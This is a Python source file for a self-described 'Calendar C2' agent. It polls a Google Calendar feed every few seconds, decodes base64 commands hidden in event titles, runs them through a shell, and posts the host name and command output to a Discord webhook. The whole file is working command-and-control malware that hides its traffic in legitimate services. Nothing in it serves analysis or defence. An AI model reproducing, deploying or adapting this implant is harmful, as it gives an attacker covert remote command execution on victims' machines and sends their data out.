import requests
from icalendar import Calendar
import base64
import subprocess
import time
from datetime import datetime, timezone, timedelta
import hashlib
import threading
import concurrent.futures

# ===== CONFIGURATION =====
CALENDAR_ICAL_URL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
DISCORD_WEBHOOK_URL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
COMMAND_PREFIX = "CMD:"

# Performance optimizations
calendar_cache = None
cache_expiry = 0
cache_ttl = 10  # Cache for only 10 seconds (faster updates)
processed_hashes = set()
last_command_time = {}

# Thread pool for parallel execution
executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

def send_to_discord_fast(command, output, returncode, hostname):
    """Fast Discord webhook send."""
    if "YOUR_WEBHOOK" in DISCORD_WEBHOOK_URL:
        return False
    
    try:
        if len(output) > 1800:
            output = output[:1700] + "\n[...truncated...]"
        
        payload = {
            "embeds": [{
                "title": "⚡ REAL-TIME C2",
                "color": 3066993 if returncode == 0 else 15158332,
                "fields": [
                    {"name": "Command", "value": f"`{command}`", "inline": True},
                    {"name": "Host", "value": f"`{hostname}`", "inline": True},
                    {"name": "Exit", "value": f"`{returncode}`", "inline": True},
                    {"name": "Output", "value": f"```{output[:1000]}```", "inline": False}
                ],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }],
            "username": "RealTimeC2"
        }
        
        threading.Thread(
            target=lambda: requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=3)
        ).start()
        return True
    except:
        return False

def get_calendar_fast():
    """Fast calendar fetch with minimal cache."""
    global calendar_cache, cache_expiry
    
    now = time.time()
    if calendar_cache and now < cache_expiry:
        return calendar_cache
    
    try:
        response = requests.get(CALENDAR_ICAL_URL, timeout=2)  # Shorter timeout
        calendar_cache = Calendar.from_ical(response.text)
        cache_expiry = now + cache_ttl
        return calendar_cache
    except:
        return None

def execute_command_now(cmd, event_id):
    """Execute command IMMEDIATELY."""
    try:
        hostname = subprocess.getoutput('hostname')
        timestamp = datetime.now(timezone.utc).strftime('%H:%M:%S')
        
        print(f"\n[{timestamp}] ⚡ EXECUTING: {cmd}")
        
        start_time = time.time()
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=10, encoding='utf-8', errors='ignore'  # Shorter timeout
        )
        exec_time = time.time() - start_time
        
        # Prepare output
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            if output:
                output += "\n"
            output += f"ERROR:\n{result.stderr}"
        
        # Show in console
        if result.stdout:
            print(f"✅ OUTPUT:\n{result.stdout[:500]}{'...' if len(result.stdout) > 500 else ''}")
        
        # Send to Discord
        send_to_discord_fast(cmd, output, result.returncode, hostname)
        
        print(f"⏱️ Time: {exec_time:.2f}s | Exit: {result.returncode}")
        
    except subprocess.TimeoutExpired:
        error_msg = "⏱️ Command timeout after 10s"
        print(error_msg)
        send_to_discord_fast(cmd, error_msg, -1, "unknown")
    except Exception as e:
        error_msg = f"⚠️ Error: {str(e)[:50]}"
        print(error_msg)
        send_to_discord_fast(cmd, error_msg, -1, "unknown")

def process_event_realtime(component):
    """REAL-TIME processing - execute immediately when detected."""
    try:
        event_id = str(component.get('uid', ''))
        
        # Get command first (fast path)
        title = str(component.get('summary', ''))
        if not title.startswith(COMMAND_PREFIX):
            return False
        
        # Extract encoded command
        encoded_cmd = title[len(COMMAND_PREFIX):].strip()
        try:
            command = base64.b64decode(encoded_cmd).decode('utf-8')
        except:
            return False
        
        # ==== REAL-TIME LOGIC ====
        # Get event time for uniqueness, but IGNORE for scheduling
        start_time = component.get('dtstart').dt
        if isinstance(start_time, datetime):
            if start_time.tzinfo is None:
                start_time = start_time.replace(tzinfo=timezone.utc)
            time_str = start_time.strftime('%H:%M')
        else:
            time_str = "now"
        
        # Create unique hash for this specific command+event
        # Include timestamp to allow same command multiple times
        now_sec = int(time.time())
        unique_hash = hashlib.md5(
            f"{command}|{event_id}|{now_sec//30}".encode()  # 30-second window
        ).hexdigest()
        
        # Check if executed recently (within last 30 seconds)
        if unique_hash in processed_hashes:
            return False
        
        # Mark as processed
        processed_hashes.add(unique_hash)
        
        # Clean old hashes (keep last 2 minutes of commands)
        if len(processed_hashes) > 100:
            # Simple cleanup - remove all but keep recent
            processed_hashes.clear()
        
        # ==== EXECUTE IMMEDIATELY ====
        print(f"[🎯] New command detected: {command}")
        print(f"[⏰] Event time: {time_str} | Executing NOW")
        
        # Execute in thread pool
        executor.submit(execute_command_now, command, event_id)
        
        # Update last command time for this event
        last_command_time[event_id] = time.time()
        
        return True
        
    except Exception as e:
        if "DEBUG" in os.environ:
            print(f"[!] Process error: {e}")
        return False

def real_time_poll():
    """Ultra-fast real-time polling."""
    print("[🔄] Starting REAL-TIME polling (3-second intervals)")
    
    last_check = 0
    poll_interval = 3  # Poll every 3 seconds!
    
    while True:
        try:
            current_time = time.time()
            
            # Poll calendar
            calendar = get_calendar_fast()
            if calendar:
                events_processed = 0
                
                # Process ALL events (ignore time checks)
                for component in calendar.walk('VEVENT'):
                    if process_event_realtime(component):
                        events_processed += 1
                
                if events_processed > 0:
                    print(f"[📊] Processed {events_processed} command(s)")
            
            # Dynamic sleep - maintain 3-second intervals
            elapsed = time.time() - current_time
            sleep_time = max(0.1, poll_interval - elapsed)
            time.sleep(sleep_time)
            
        except KeyboardInterrupt:
            print("\n[🛑] Real-time agent stopped")
            break
        except Exception as e:
            print(f"[⚠️] Poll error: {e}")
            time.sleep(5)

def main():
    print("[🚀] REAL-TIME Calendar C2 Started")
    print("[⚡] Commands execute IMMEDIATELY on detection")
    print(f"[📅] Calendar: {CALENDAR_ICAL_URL[:50]}...")
    print("[🔄] Polling every 3 seconds")
    print("-" * 60)
    
    if "YOUR_WEBHOOK" in DISCORD_WEBHOOK_URL:
        print("[⚠️] WARNING: Discord webhook not configured")
        print("[⚠️] Edit DISCORD_WEBHOOK_URL in the code")
    else:
        print("[✅] Discord webhook ready")
    
    print("\n[🎯] HOW TO USE:")
    print("1. Create Google Calendar event")
    print("2. Title format: CMD: [base64_command]")
    print("3. Save event")
    print("4. Command executes in 3-10 seconds")
    print("-" * 60)
    
    # Start real-time polling
    real_time_poll()

if __name__ == "__main__":
    import os
    main()